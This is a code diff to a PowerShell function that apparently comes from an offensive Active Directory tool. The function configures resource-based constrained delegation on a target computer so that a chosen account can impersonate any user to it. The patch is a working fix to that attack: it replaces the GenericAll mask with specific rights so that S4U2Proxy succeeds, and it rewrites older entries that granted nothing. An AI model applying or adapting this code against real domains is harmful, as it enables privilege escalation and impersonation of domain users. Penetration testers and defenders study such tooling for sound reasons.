@@ -97,9 +97,18 @@ function Invoke-RBCDOperation {
 
             # RBCD uses a RAW Security Descriptor, not an AD-specific one
             # The msDS-AllowedToActOnBehalfOfOtherIdentity attribute stores a binary SD
-            # where the DACL contains ACEs granting "GenericAll" (0x10000000) to allowed principals
+            # whose DACL grants each allowed principal full control, written OUT as specific
+            # rights: 0x000F01FF = CCDCLCSWRPWPDTLOCRSDRCWDWO, the mask Set-ADComputer
+            # -PrincipalsAllowedToDelegateToAccount writes. Not the generic bit GenericAll
+            # (0x10000000, "GA"): AD stores this attribute as plain bytes and maps nothing,
+            # and the KDC's access check does not map a generic right found in an ACE, so
+            # an O:BAD:(A;;GA;;;<sid>) descriptor grants nothing - S4U2Proxy was refused with
+            # KDC_ERR_BADOPTION until the same principal was written with the specific
+            # mask (measured against a Server 2019 DC, 2026-11-12).
+            $RBCDAccessMask = 0x000F01FF
 
             $AlreadyExists = $false
+            $Repaired = $false
 
             # Get existing SD bytes from LDAP result (Get-DomainObject -Raw returns byte[])
             $ExistingSDBytes = $null
@@ -120,20 +129,29 @@ function Invoke-RBCDOperation {
                     # RawAcl returns GenericAce objects, cast to CommonAce to access SecurityIdentifier
                     $commonAce = [System.Security.AccessControl.CommonAce]$ace
                     if ($commonAce.SecurityIdentifier.Value -eq $DelegateSID.Value) {
-                        $AlreadyExists = $true
-                        Write-Log "$FunctionPrefix ACE for $DelegateSID already exists"
+                        if (($commonAce.AccessMask -band $RBCDAccessMask) -eq $RBCDAccessMask) {
+                            $AlreadyExists = $true
+                            Write-Log "$FunctionPrefix ACE for $DelegateSID already exists"
+                        } else {
+                            # An entry without the specific rights - GA as adPEAS wrote it before
+                            # 2026-11-12 - names the principal but grants it nothing. Reporting it
+                            # as present would leave the delegation inert; rewrite its mask.
+                            Write-Log "$FunctionPrefix ACE for $DelegateSID has mask 0x$('{0:X8}' -f $commonAce.AccessMask), rewriting it to 0x$('{0:X8}' -f $RBCDAccessMask)"
+                            $commonAce.AccessMask = $RBCDAccessMask
+                            $Repaired = $true
+                        }
                         break
                     }
                 }
 
-                if (-not $AlreadyExists) {
-                    # Add new ACE: GenericAll (0x10000000) for the delegate SID
+                if (-not $AlreadyExists -and -not $Repaired) {
+                    # Add new ACE: full control, as specific rights, for the delegate SID
                     $RawSD.DiscretionaryAcl.InsertAce(
                         $RawSD.DiscretionaryAcl.Count,
                         (New-Object System.Security.AccessControl.CommonAce(
                             [System.Security.AccessControl.AceFlags]::None,
                             [System.Security.AccessControl.AceQualifier]::AccessAllowed,
-                            0x10000000,  # GenericAll
+                            $RBCDAccessMask,
                             $DelegateSID,
                             $false,
                             $null
@@ -146,7 +164,7 @@ function Invoke-RBCDOperation {
                 # Create new RawSecurityDescriptor with empty DACL
                 $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:")
 
-                # Create DACL with single ACE granting GenericAll to delegate SID
+                # Create DACL with single ACE granting full control (specific rights) to the delegate SID
                 $RawSD.DiscretionaryAcl = New-Object System.Security.AccessControl.RawAcl(
                     [System.Security.AccessControl.RawAcl]::AclRevision,
                     1
@@ -156,7 +174,7 @@ function Invoke-RBCDOperation {
                     (New-Object System.Security.AccessControl.CommonAce(
                         [System.Security.AccessControl.AceFlags]::None,
                         [System.Security.AccessControl.AceQualifier]::AccessAllowed,
-                        0x10000000,  # GenericAll
+                        $RBCDAccessMask,
                         $DelegateSID,
                         $false,
                         $null
@@ -194,12 +212,15 @@ function Invoke-RBCDOperation {
                     DistinguishedName = $TargetDN
                     DelegateFrom = $DelegateName
                     AlreadyExisted = $AlreadyExists
+                    Repaired = $Repaired
                     Success = $true
-                    Message = if ($AlreadyExists) { "RBCD entry already existed" } else { "RBCD successfully configured. $DelegateName can now impersonate users to $TargetSAMAccountName" }
+                    Message = if ($AlreadyExists) { "RBCD entry already existed" } elseif ($Repaired) { "RBCD entry repaired: its ACE granted no specific rights. $DelegateName can now impersonate users to $TargetSAMAccountName" } else { "RBCD successfully configured. $DelegateName can now impersonate users to $TargetSAMAccountName" }
                 }
             } else {
                 if ($AlreadyExists) {
                     Show-Line "RBCD entry already exists for $DelegateName on: $TargetSAMAccountName" -Class Note
+                } elseif ($Repaired) {
+                    Show-Line "Repaired RBCD entry for $DelegateName on: $TargetSAMAccountName (it granted no specific rights)" -Class Hint
                 } else {
                     Show-Line "Successfully configured RBCD on target: $TargetSAMAccountName" -Class Hint
                     Show-KeyValue "Attacker (can impersonate):" $DelegateName
